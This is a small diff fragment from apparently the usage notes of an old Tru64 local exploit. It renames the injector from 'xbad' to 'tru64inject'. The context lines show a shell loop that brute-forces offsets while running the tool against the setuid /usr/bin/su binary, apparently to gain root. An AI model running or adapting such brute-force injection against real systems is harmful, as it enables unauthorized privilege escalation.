@@ -6,7 +6,7 @@
    need offset or brute force? use as below
 
    tru64> for i in `perl -e 'for($a=0;$a<512;$a++){printf("%d\n",$a);}'`;
-   > do ./xbad /usr/bin/su $i
+   > do ./tru64inject /usr/bin/su $i
    > done
 
    - if task_for_pid ever succeeds then you have BSD over mach as only
